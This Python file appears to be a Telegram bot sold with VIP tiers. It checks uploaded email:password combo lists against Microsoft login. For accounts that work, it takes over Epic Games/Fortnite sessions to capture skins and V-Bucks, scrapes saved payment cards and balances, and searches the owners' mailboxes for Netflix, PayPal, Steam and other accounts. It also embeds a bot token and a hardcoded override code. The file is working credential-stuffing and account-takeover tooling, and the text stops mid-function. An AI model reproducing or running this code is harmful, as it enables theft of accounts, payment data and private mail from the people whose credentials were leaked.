import os
import sys
import time
import json
import uuid
import queue
import threading
import requests
import re
import urllib.parse
import ssl
import imaplib
import base64
import cloudscraper
import random
import secrets
import email as email_lib
from email.header import decode_header as decode_hdr
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8650837363:AAGc7cfEhAHponP_4zTeVL7QeB4PZ1tTRP8")
GROUP_ID = int(os.getenv("TELEGRAM_GROUP_ID", "-1002893702017"))
API_BASE = "https://api.telegram.org/bot"
FILE_BASE = "https://api.telegram.org/file/bot"

def api(method, data=None, files=None):
    r = requests.post(f"{API_BASE}{BOT_TOKEN}/{method}", data=data, files=files, timeout=60)
    return r.json()

def get_updates(offset=None, timeout=30):
    data = {"timeout": timeout}
    if offset:
        data["offset"] = offset
    return api("getUpdates", data)

def send_message(chat_id, text, reply_markup=None):
    data = {"chat_id": chat_id, "text": text}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    return api("sendMessage", data)

def edit_message(chat_id, message_id, text):
    data = {"chat_id": chat_id, "message_id": message_id, "text": text}
    return api("editMessageText", data)

# ------------------- Access control / VIP -------------------
CONTROL_GROUP_ID = int(os.getenv("CONTROL_GROUP_ID", "-1002789978571"))
ADMIN_ID = int(os.getenv("ADMIN_ID", "7677328359"))
VIP_WINDOW_SECONDS = 2 * 60 * 60  # 2 hours for normal users
NORMAL_LIMIT = 100

# VIP logic
vip_codes = {}      # code -> {"expires_at": ts, "duration": duration, "claimed_by": None or user_id, "duration_type": str}
vip_users_info = {}  # user_id -> {"expires": ts, "code": str}
all_users = set()    # To track all users for broadcast
awaiting_broadcast = False # Admin state

def generate_random_code(length=10):
    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(secrets.choice(alphabet) for _ in range(length))

def create_vip_code(duration_type):
    code = generate_random_code(10)
    now = time.time()
    if duration_type == "day":
        duration = 86400
    elif duration_type == "week":
        duration = 86400 * 7
    elif duration_type == "month":
        duration = 86400 * 30
    else:
        duration = 3600
    vip_codes[code] = {"expires_at": now + duration, "duration": duration, "claimed_by": None, "duration_type": duration_type}
    return code

def try_claim_vip(user_id, code):
    code_str = str(code).strip().lower()
    if code_str == "codevipanon199":
        vip_users_info[user_id] = {"expires": time.time() + 315360000, "code": "ADMIN_OVERRIDE"} # 10 years
        return True, "Unlimited VIP activated"
    
    info = vip_codes.get(code_str)
    if not info:
        return False, "Code not found"
    
    if info["claimed_by"] and info["claimed_by"] != user_id:
        return False, "Code already used"
    
    now = time.time()
    info["claimed_by"] = user_id
    vip_users_info[user_id] = {"expires": now + info["duration"], "code": code_str}
    return True, f"VIP activated ({info['duration_type']})"

def check_vip_expiry():
    """Check for expired VIPs and notify them"""
    while True:
        try:
            now = time.time()
            expired = []
            for uid, data in list(vip_users_info.items()):
                if now > data["expires"]:
                    expired.append(uid)
            
            for uid in expired:
                vip_users_info.pop(uid, None)
                send_message(uid, "⚠️ Your VIP subscription has expired.\nTo renew, please contact: @anon_101")
        except: pass
        time.sleep(60)

threading.Thread(target=check_vip_expiry, daemon=True).start()

user_usage = {}    # user_id -> {"start": ts, "count": int}
reminder_marks = {}  # user_id -> window_start to avoid duplicate reminders

def check_user_limit(user_id, new_count):
    if user_id in vip_users_info:
        return True, 0
    rec = user_usage.get(user_id)
    now = time.time()
    if not rec or now - rec["start"] > VIP_WINDOW_SECONDS:
        user_usage[user_id] = {"start": now, "count": 0}
        rec = user_usage[user_id]
    if rec["count"] + new_count > NORMAL_LIMIT:
        remaining = int((VIP_WINDOW_SECONDS - (now - rec["start"])) / 60) + 1
        return False, max(remaining, 1)
    rec["count"] += new_count
    return True, 0

def schedule_limit_reset_message(user_id):
    try:
        rec = user_usage.get(user_id)
        if not rec: return
        ws = rec.get("start")
        if ws is None: return
        if reminder_marks.get(user_id) == ws: return
        reminder_marks[user_id] = ws
        delay = max(0, int(VIP_WINDOW_SECONDS - (time.time() - ws)))
        def _runner():
            time.sleep(delay)
            send_message(user_id, "you can now send another 100 accounts\nor you can buy this : \nunlimited check\nSearch with your keywords\nif want send msg here : @anon_101")
        threading.Thread(target=_runner, daemon=True).start()
    except: pass

def send_document(chat_id, path, caption=None):
    with open(path, "rb") as f:
        files = {"document": f}
        data = {"chat_id": chat_id}
        if caption:
            data["caption"] = caption
        return api("sendDocument", data, files=files)

# ------------------- Dates and Currency Helpers (from q.py) -------------------
from datetime import datetime

def get_remaining_days(date_str):
    try:
        if not date_str:
            return "0"
        renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
        today = datetime.now(renewal_date.tzinfo)
        remaining = (renewal_date - today).days
        return str(remaining)
    except:
        return "0"

CURRENCY_SYMBOLS = {
    "USD": "$", "EUR": "€", "GBP": "£", "JPY": "¥", "CNY": "¥",
    "RUB": "₽", "TRY": "₺", "INR": "₹", "KRW": "₩", "AED": "د.إ",
    "SAR": "﷼", "QAR": "﷼", "KWD": "د.ك", "BHD": ".د.ب", "OMR": "﷼",
    "EGP": "£", "MAD": "د.م.", "TND": "د.ت", "DZD": "د.ج", "LBP": "ل.ل",
    "JOD": "د.أ", "ILS": "₪", "PKR": "₨", "BDT": "৳", "THB": "฿",
    "IDR": "Rp", "MYR": "RM", "SGD": "$", "HKD": "$", "AUD": "$",
    "NZD": "$", "CAD": "$", "MXN": "$", "ARS": "$", "CLP": "$",
    "COP": "$", "BRL": "R$", "PHP": "₱", "NGN": "₦", "ZAR": "R",
}

AMBIGUOUS_CODES = {"USD", "CAD", "AUD", "NZD", "MXN", "ARS", "CLP", "COP", "HKD", "SGD", "CNY", "JPY"}

def format_currency(amount, code=None):
    try:
        amt_str = str(amount).strip()
        if code:
            code = code.upper().strip()
        sym = CURRENCY_SYMBOLS.get(code or "", "")
        if sym:
            if code in AMBIGUOUS_CODES:
                return f"{sym}{amt_str} {code}"
            return f"{sym}{amt_str}"
        if code:
            return f"{amt_str} {code}"
        return amt_str
    except:
        return str(amount)

def get_file(file_id):
    j = api("getFile", {"file_id": file_id})
    if not j.get("ok"):
        return None
    fp = j["result"]["file_path"]
    r = requests.get(f"{FILE_BASE}{BOT_TOKEN}/{fp}", timeout=60)
    return r.content

def get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=10).text
    except:
        return "unknown"

def parse_accounts_bytes(data):
    if not data: return []
    # robust cleaning: remove duplicates, empty lines, only keep email:pass
    lines = data.decode(errors="ignore").replace("\r\n", "\n").split("\n")
    out = []
    seen = set()
    for ln in lines:
        ln = ln.strip()
        if not ln: continue
        # use regex to find email:pass
        match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,10}):(\S+)', ln)
        if match:
            em = match.group(1).lower().strip()
            pw = match.group(2).strip()
            k = f"{em}:{pw}"
            if k not in seen:
                seen.add(k)
                out.append((em, pw))
    return out

# ------------------- Fortnite Logic (BoltFN Integration) -------------------
class FortniteLogic:
    def __init__(self, timeout=10, retries=1):
        self.timeout = timeout
        self.retries = retries
        self.scraper = cloudscraper.create_scraper()
        self.skin_db_path = os.path.join(os.getcwd(), "fortnite", "skins_database.txt")
        self.local_skins = []
        if os.path.exists(self.skin_db_path):
            with open(self.skin_db_path, "r", encoding="utf-8") as f:
                self.local_skins = f.readlines()

    def check_account(self, line):
        # Ported from boltchecker.py usecheck
        try:
            if ":" not in line: return {"status": "BAD"}
            email, password = line.split(":", 1)
            checked_num = 0
            while checked_num <= self.retries:
                session = requests.sessions.session()
                # No proxy used as requested
                url = 'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216'
                headers = {
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en,en-US;q=0.9,en;q=0.8",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
                    "Host": "login.live.com",
                    "Origin": "https://login.live.com",
                    "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
                }
                payload = {
                    "i13": "0", "login": email, "loginfmt": email, "type": "11", "LoginOptions": "3",
                    "passwd": password, "ps": "2", "psRNGCDefaultType": "1", "ppsx": "Passp", "NewUser": "1",
                }
                
                try:
                    r = session.post(url, headers=headers, data=payload, timeout=self.timeout)
                    if r.status_code == 429:
                        checked_num += 1; continue
                except:
                    checked_num += 1; continue

                failure_keywords = ["Your account or password is incorrect.", "That Microsoft account doesn't exist."]
                two_factor_keywords = ["account.live.com/recover", "recover?mkt", "identity/confirm"]
                
                if any(k in r.text for k in failure_keywords): return {"status": "BAD"}
                if any(k in r.text for k in two_factor_keywords): return {"status": "2FA"}
                if "ANON" in r.cookies or "WLSSC" in r.cookies or "sSigninName" in r.text:
                    # Success in MS Auth
                    return self.capture_epic(session, r, email, password)
                
                checked_num += 1
            return {"status": "BAD"}
        except:
            return {"status": "BAD"}

    def capture_epic(self, session, response, email, password):
        url = self.parse_source_for_url(response.text)
        if not url: return {"status": "XBOX"}
        
        try:
            # 1. Get redirect URL from response
            r = session.get(url, allow_redirects=False, timeout=self.timeout)
            if 'route=' not in r.headers.get('location', ''): return {"status": "XBOX"}
            
            # 2. Extract code from redirect
            parsed_url = urllib.parse.urlparse(r.headers['location'])
            query_params = urllib.parse.parse_qs(parsed_url.query)
            code = query_params.get('code', [None])[0]
            if not code: return {"status": "XBOX"}

            # 3. Epic Login via code
            url = "https://www.epicgames.com/id/api/external/xbl/login"
            payload = {"code": code}
            xsrf = session.cookies.get('XSRF-TOKEN')
            headers = {"X-XSRF-TOKEN": xsrf, "Content-Type": "application/json"}
            r = session.post(url, json=payload, headers=headers, timeout=self.timeout)
            
            if 'Two-Factor authentication' in r.text: return {"status": "2FA"}
            if 'account_headless' in r.text: return {"status": "HEADLESS"}
            
            # 4. Get access token
            url = "https://www.epicgames.com/id/api/redirect?redirectUrl=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&provider=xbl&clientId=875a3b57d3a640a6b7f9b4e883463ab4"
            r = session.get(url, timeout=self.timeout)
            ex_match = re.search(r'"exchangeCode":"(.*?)"', r.text)
            if not ex_match: return {"status": "HIT", "email": email, "password": password}
            
            exchange_code = ex_match.group(1)
            url = "https://account-public-service-prod.ak.epicgames.com/account/api/oauth/token"
            payload = {"grant_type": "exchange_code", "exchange_code": exchange_code, "token_type": "eg1"}
            headers = {"Authorization": "basic MzRhMDJjZjhmNDQxNGUyOWIxNTkyMTg3NmRhMzZmOWE6ZGFhZmJjY2M3Mzc3NDUwMzlkZmZlNTNkOTRmYzc2Y2Y="}
            r = session.post(url, data=payload, headers=headers, timeout=self.timeout)
            
            token_data = r.json()
            at = token_data.get("access_token")
            acc_id = token_data.get("account_id")
            if not at: return {"status": "HIT", "email": email, "password": password}

            # 5. Query Profile (Athena - Skins)
            url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{acc_id}/client/QueryProfile?profileId=athena&rvn=-1"
            headers = {"Authorization": f"bearer {at}", "Content-Type": "application/json"}
            r = session.post(url, json={}, headers=headers, timeout=self.timeout)
            
            skins = []
            if r.status_code == 200:
                data = r.json()
                items = data.get('profileChanges', [{}])[0].get('profile', {}).get('items', {})
                for item_id, item in items.items():
                    tid = item.get('templateId', '')
                    if tid.startswith('AthenaCharacter:'):
                        skin_id = tid.split(':')[1]
                        skins.append(skin_id)
            
            # 6. Query Common Core (V-Bucks)
            url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{acc_id}/client/QueryProfile?profileId=common_core&rvn=-1"
            r = session.post(url, json={}, headers=headers, timeout=self.timeout)
            vbucks = 0
            if r.status_code == 200:
                data = r.json()
                items = data.get('profileChanges', [{}])[0].get('profile', {}).get('items', {})
                for item_id, item in items.items():
                    if 'Currency:Mtx' in item.get('templateId', ''):
                        vbucks += item.get('quantity', 0)

            return {
                "status": "HIT", 
                "email": email, 
                "password": password, 
                "skins": skins, 
                "vbucks": vbucks,
                "acc_id": acc_id
            }
        except:
            return {"status": "HIT", "email": email, "password": password}

    def parse_source_for_url(self, source):
        match = re.search(r'urlPost":"(.*?)"', source)
        return match.group(1) if match else None

# ------------------- End Fortnite Logic -------------------

class UnifiedChecker:
    def __init__(self, debug=False, custom_services=None):
        self.session = requests.Session()
        self.session.trust_env = False
        self.session.proxies = {}
        adapter = requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=20, max_retries=0)
        self.session.mount('https://', adapter)
        self.session.mount('http://', adapter)
        self.uuid = str(uuid.uuid4())
        self.debug = debug
        self.services_map = custom_services or {
            'advertise-support.facebook.com': 'Facebook',
            'mail.instagram.com': 'Instagram',
            'account.tiktok.com': 'TikTok',
            'x.com': 'Twitter',
            'youtube.com': 'YouTube',
            'discordapp.com': 'Discord',
            'spotify.com': 'Spotify',
            'netflix.com': 'Netflix',
            'steampowered.com': 'Steam',
            'epicgames.com': 'Epic Games',
            'riotgames.com': 'Riot Games',
            'ubisoft.com': 'Ubisoft',
            'blizzard.com': 'Blizzard',
            'rockstargames.com': 'Rockstar',
            'nintendo.com': 'Nintendo',
            'roblox.com': 'Roblox',
            'paypal.com': 'PayPal',
            'binance.com': 'Binance',
            'amazon.com': 'Amazon',
            'ebay.com': 'eBay',
            'aliexpress.com': 'AliExpress',
            'temu.com': 'Temu',
            'shein.com': 'Shein',
            'hulu.com': 'Hulu',
            'disneyplus.com': 'Disney+',
            'viu.com': 'Viu',
            'tubitv.com': 'Tubi TV',
            'crunchyroll.com': 'Crunchyroll',
            'ea.com': 'EA Sports',
            'battlenet.com': 'Battle.net',
            'apple.com': 'Apple',
            'icloud.com': 'iCloud',
            'canva.com': 'Canva',
            'github.com': 'GitHub',
            'gitlab.com': 'GitLab',
            'bitbucket.com': 'Bitbucket',
            'replit.com': 'Replit',
            'azure.microsoft.com': 'Azure',
            'metrobank.com.ph': 'Metrobank',
            'landbank.com': 'LandBank',
            'securitybank.com': 'Security Bank',
            'coinbase.com': 'Coinbase',
            'etoro.com': 'eToro',
        }

    def log(self, msg):
        if self.debug:
            print(msg)

    def parse_country_from_json(self, j):
        try:
            if isinstance(j, dict):
                for k in ['country', 'countryOrRegion', 'countryCode', 'Country']:
                    if k in j and j[k]:
                        return str(j[k])
                if 'accounts' in j:
                    for acc in j['accounts']:
                        if isinstance(acc, dict) and acc.get('location'):
                            return str(acc['location'])
        except:
            pass
        return ''

    def parse_name_from_json(self, j):
        try:
            if isinstance(j, dict):
                for k in ['displayName', 'name', 'givenName', 'fullName']:
                    if k in j and j[k]:
                        return str(j[k])
        except:
            pass
        return ''

    def _ms_hard_login(self, email, password):
        try:
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            h1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = self.session.get(url1, headers=h1, timeout=15)
            if "MSAccount" not in r1.text:
                return None
            time.sleep(0.3)
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r2 = self.session.get(url2, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True, timeout=15)
            m_url = re.search(r'urlPost":"([^"]+)"', r2.text)
            m_ppft = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not m_url or not m_ppft:
                return None
            post_url = m_url.group(1).replace("\\/", "/")
            ppft = m_ppft.group(1)
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR&NewUser=1"
            h3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = self.session.post(post_url, data=login_data, headers=h3, allow_redirects=False, timeout=10)
            loc = r3.headers.get("Location", "")
            if not loc:
                return None
            m_code = re.search(r'code=([^&]+)', loc)
            if not m_code:
                return None
            code = m_code.group(1)
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                   data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10)
            if r4.status_code != 200 or "access_token" not in r4.text:
                return None
            j = r4.json()
            at = j.get("access_token", "")
            rt = j.get("refresh_token", "")
            cid = (self.session.cookies.get("MSPCID", "") or "").upper()
            return {"access_token": at, "refresh_token": rt, "cid": cid}
        except:
            return None

    def _graph_msg_count(self, at):
        try:
            r = self.session.get("https://graph.microsoft.com/v1.0/me/mailFolders/inbox",
                                 headers={"Authorization": f"Bearer {at}"}, timeout=12)
            if r.status_code == 200:
                return r.json().get("totalItemCount", 0)
        except:
            pass
        return 0

    def _profile(self, at, cid):
        country = ""
        name = ""
        try:
            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                                 headers={"Authorization": f"Bearer {at}", "X-AnchorMailbox": f"CID:{cid}"}, timeout=15)
            if r.status_code == 200:
                j = r.json()
                country = self.parse_country_from_json(j)
                name = self.parse_name_from_json(j)
        except:
            pass
        return country, name

    def check_microsoft_subscriptions(self, email, password, at, cid):
        try:
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + urllib.parse.quote(state_json)
            r = self.session.get(url, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True, timeout=20)
            payment_token = None
            text = r.text + " " + r.url
            for pat in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                m = re.search(pat, text)
                if m:
                    payment_token = urllib.parse.unquote(m.group(1))
                    break
            if not payment_token:
                return {"ms_status": "FREE", "ms_data": {}, "xbox": {"status": "FREE", "details": ""}}
            ms_data = {}
            h = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json",
                "Authorization": f'MSADELEGATE1.0="{payment_token}"',
                "Content-Type": "application/json",
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/"
            }
            try:
                pay_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r_pay = self.session.get(pay_url, headers=h, timeout=15)
                if r_pay.status_code == 200:
                    # Capture multiple balances
                    balances = re.findall(r'"balance"\s*:\s*([0-9]+(?:\.[0-9]+)?).*?"currency(?:Code)?"\s*:\s*"([A-Z]{3})"', r_pay.text)
                    if balances:
                        ms_data["balances"] = [f"{amt} {cur}" for amt, cur in balances]
                        ms_data["balance_amount"] = balances[0][0]
                        ms_data["balance_currency"] = balances[0][1]
                    
                    # Capture cards (Visa, Master, etc.)
                    cards = re.findall(r'"paymentMethodFamily"\s*:\s*"([^"]+)".*?"name"\s*:\s*"([^"]+)".*?"lastFourDigits"\s*:\s*"([^"]*)"', r_pay.text, re.DOTALL)
                    if cards:
                        ms_data["cards"] = [f"{fam} {name} (***{last})" for fam, name, last in cards]
                    
                    m3 = re.search(r'"availablePoints"\s*:\s*(\d+)', r_pay.text)
                    if m3:
                        ms_data["rewards_points"] = m3.group(1)
            except:
                pass
            xbox = {"status": "FREE", "details": ""}
            try:
                tr_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r_sub = self.session.get(tr_url, headers=h, timeout=15)
                if r_sub.status_code == 200:
                    t = r_sub.text
                    kw = {'Xbox Game Pass Ultimate': 'Ultimate', 'PC Game Pass': 'PC Game Pass', 'EA Play': 'EA Play', 'Xbox Live Gold': 'Gold', 'Game Pass': 'Game Pass'}
                    for k, nm in kw.items():
                        if k in t:
                            m = re.search(r'"nextRenewalDate"\s*:\s*"([^"]+)"', t)
                            details = nm
                            if m:
                                days = get_remaining_days(m.group(1))
                                if days.startswith('-'): break
                                details = f"{nm} ({days}d)"
                            xbox = {"status": "PREMIUM", "details": details}
                            break
            except: pass
            return {"ms_status": "PREMIUM" if xbox["status"] != "FREE" else "FREE", "ms_data": ms_data, "xbox": xbox}
        except:
            return {"ms_status": "ERROR", "ms_data": {}, "xbox": {"status": "ERROR", "details": ""}}

    def _imap_xoauth2_connect(self, email_addr, access_token, host='outlook.office365.com', port=993): 
        try: 
            auth_bytes = f"user={email_addr}\x01auth=Bearer {access_token}\x01\x01".encode() 
            auth_b64 = base64.b64encode(auth_bytes) 
            ctx = ssl.create_default_context() 
            ctx.check_hostname = False 
            ctx.verify_mode = ssl.CERT_NONE 
            mail = imaplib.IMAP4_SSL(host, port, ssl_context=ctx) 
            mail.authenticate('XOAUTH2', lambda _: auth_b64) 
            return mail, None 
        except Exception as e: 
            return None, str(e)[:80] 
 
    def _imap_fetch_latest_from(self, email_addr, access_token, sender_substr, host='imap-mail.outlook.com', count=200): 
        try: 
            mail, err = self._imap_xoauth2_connect(email_addr, access_token, host, 993) 
            if not mail: 
                return None, None 
            mail.select('INBOX', readonly=True) 
            typ, data = mail.search(None, 'ALL') 
            ids = data[0].split() if data and data[0] else [] 
            ids = list(reversed(ids[-count:] if len(ids) > count else ids)) 
            ss = sender_substr.lower() 
            for mid in ids: 
                t, md = mail.fetch(mid, '(RFC822)') 
                if t != 'OK' or not md: 
                    continue 
                raw = md[0][1] if isinstance(md[0], tuple) else b'' 
                msg = email_lib.message_from_bytes(raw) 
                frm = (msg.get('From') or '').lower() 
                if ss in frm: 
                    subj = msg.get('Subject') or '' 
                    dt = msg.get('Date') or '' 
                    return subj, dt 
        except: 
            pass 
        return None, None 
 
    def check_netflix(self, access_token, cid, email_addr): 
        try: 
            url = "https://outlook.live.com/search/api/v2/query" 
            h = { 
                'User-Agent': 'Outlook-Android/2.0', 
                'Authorization': f'Bearer {access_token}', 
                'X-AnchorMailbox': f'CID:{cid}', 
                'Content-Type': 'application/json' 
            } 
            q = 'info@account.netflix.com' 
            payload = { 
                "Cvid": str(uuid.uuid4()), 
                "Scenario": {"Name": "owa.react"}, 
                "TimeZone": "UTC", 
                "TextDecorations": "Off", 
                "EntityRequests": [{ 
                    "EntityType": "Conversation", 
                    "ContentSources": ["Exchange"], 
                    "Filter": {"Or": [ 
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}}, 
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}, 
                        {"Term": {"DistinguishedFolderName": "Inbox"}} 
                    ]}, 
                    "From": 0, 
                    "Query": {"QueryString": q}, 
                    "Size": 50, 
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}] 
                }] 
            } 
            r = self.session.post(url, json=payload, headers=h, timeout=10) 
            if r.status_code == 200: 
                data = r.json() 
                total = 0 
                last_s = "" 
                last_d = "" 
                for es in data.get('EntitySets', []): 
                    for rs in es.get('ResultSets', []): 
                        total = rs.get('Total', 0) 
                        if total > 0 and rs.get('Results'): 
                            last = rs['Results'][0] 
                            last_s = last.get('Subject', '') 
                            last_d = last.get('ReceivedDateTime', '') 
                        break 
                if not last_s or not last_d: 
                    s2, d2 = self._imap_fetch_latest_from(email_addr, access_token, 'account.netflix.com') 
                    if s2: 
                        last_s = s2 
                    if d2: 
                        last_d = d2 
                return {"netflix_status": "LINKED" if total > 0 else "FREE", "netflix_emails": total, "netflix_last_subject": last_s[:100], "netflix_last_date": last_d[:20]} 
            return {"netflix_status": "FREE", "netflix_emails": 0} 
        except: 
            return {"netflix_status": "ERROR", "netflix_emails": 0} 
 
    def check_facebook(self, access_token, cid, email_addr): 
        try: 
            url = "https://outlook.live.com/search/api/v2/query" 
            h = { 
                'User-Agent': 'Outlook-Android/2.0', 
                'Authorization': f'Bearer {access_token}', 
                'X-AnchorMailbox': f'CID:{cid}', 
                'Content-Type': 'application/json' 
            } 
            q = "advertise-support.facebook.com" 
            payload = { 
                "Cvid": str(uuid.uuid4()), 
                "Scenario": {"Name": "owa.react"}, 
                "TimeZone": "UTC", 
                "TextDecorations": "Off", 
                "EntityRequests": [{ 
                    "EntityType": "Conversation", 
                    "ContentSources": ["Exchange"], 
                    "Filter": {"Or": [ 
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}}, 
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}, 
                        {"Term": {"DistinguishedFolderName": "Inbox"}} 
                    ]}, 
                    "From": 0, 
                    "Query": {"QueryString": q}, 
                    "Size": 50, 
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}] 
                }] 
            } 
            r = self.session.post(url, json=payload, headers=h, timeout=10) 
            if r.status_code == 200: 
                data = r.json() 
                total = 0 
                last_s = "" 
                last_d = "" 
                for es in data.get('EntitySets', []): 
                    for rs in es.get('ResultSets', []): 
                        total = rs.get('Total', 0) 
                        if total > 0 and rs.get('Results'): 
                            last = rs['Results'][0] 
                            last_s = last.get('Subject', '') 
                            last_d = last.get('ReceivedDateTime', '') 
                        break 
                if not last_s or not last_d: 
                    s2, d2 = self._imap_fetch_latest_from(email_addr, access_token, 'facebook') 
                    if s2: 
                        last_s = s2 
                    if d2: 
                        last_d = d2 
                return {"facebook_status": "LINKED" if total > 0 else "FREE", "facebook_emails": total, "facebook_last_subject": last_s[:100], "facebook_last_date": last_d[:20]} 
            return {"facebook_status": "FREE", "facebook_emails": 0} 
        except: 
            return {"facebook_status": "ERROR", "facebook_emails": 0} 
 
    # --- Additional service scans (Outlook Search first, IMAP fallback) --- 
    def _search_count(self, access_token, cid, query, timeout=10): 
        try: 
            url = "https://outlook.live.com/search/api/v2/query" 
            h = { 
                'User-Agent': 'Outlook-Android/2.0', 
                'Authorization': f'Bearer {access_token}', 
                'X-AnchorMailbox': f'CID:{cid}', 
                'Content-Type': 'application/json' 
            } 
            payload = { 
                "Cvid": str(uuid.uuid4()), 
                "Scenario": {"Name": "owa.react"}, 
                "TimeZone": "UTC", 
                "TextDecorations": "Off", 
                "EntityRequests": [{ 
                    "EntityType": "Conversation", 
                    "ContentSources": ["Exchange"], 
                    "Filter": {"Or": [ 
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}}, 
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}, 
                        {"Term": {"DistinguishedFolderName": "Inbox"}} 
                    ]}, 
                    "From": 0, 
                    "Query": {"QueryString": query}, 
                    "Size": 50, 
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}] 
                }] 
            } 
            r = self.session.post(url, json=payload, headers=h, timeout=timeout) 
            if r.status_code != 200: 
                return 0 
            total = 0 
            for es in r.json().get('EntitySets', []): 
                for rs in es.get('ResultSets', []): 
                    total = rs.get('Total', 0) 
                    break 
            return int(total or 0) 
        except: 
            return 0 
 
    def check_psn(self, access_token, cid): 
        q = "sony@txn-email.playstation.com OR sony@txn-email01.playstation.com OR sony@txn-email02.playstation.com OR sony@txn-email03.playstation.com" 
        total = self._search_count(access_token, cid, q, timeout=12) 
        return {"psn_status": "HAS_ORDERS" if total > 0 else "FREE", "psn_emails_count": total} 
 
    def check_steam_simple(self, access_token, cid): 
        q = "store.steampowered.com OR noreply@steampowered.com OR Steam purchase" 
        total = self._search_count(access_token, cid, q, timeout=10) 
        return {"steam_status": "HAS_PURCHASES" if total > 0 else "FREE", "steam_count": total} 
 
    def check_minecraft_simple(self, access_token, cid): 
        q = "mojang.com OR minecraft.net OR noreply@mojang.com" 
        total = self._search_count(access_token, cid, q, timeout=10) 
        return {"minecraft_status": "OWNED" if total > 0 else "FREE", "minecraft_emails": total} 
 
    def check_paypal_simple(self, access_token, cid): 
        q = "service@paypal.com OR @paypal.com" 
        total = self._search_count(access_token, cid, q, timeout=10) 
        return {"paypal_status": "LINKED" if total > 0 else "FREE", "paypal_emails": total} 
 
    def check_epic_simple(self, access_token, cid): 
        q = "@epicgames.com OR Epic Games" 
        total = self._search_count(access_token, cid, q, timeout=10) 
        return {"epic_status": "LINKED" if total > 0 else "FREE", "epic_emails": total} 
 
    def _scan_services(self, at, cid, email_addr): 
        out = {} 
        # Use multi-service detection (search + IMAP) 
        try: 
            nf = self.check_netflix(at, cid, email_addr) 
            if nf.get("netflix_status") == "LINKED": 
                out["Netflix"] = True 
        except: nf = {} 
        try: 
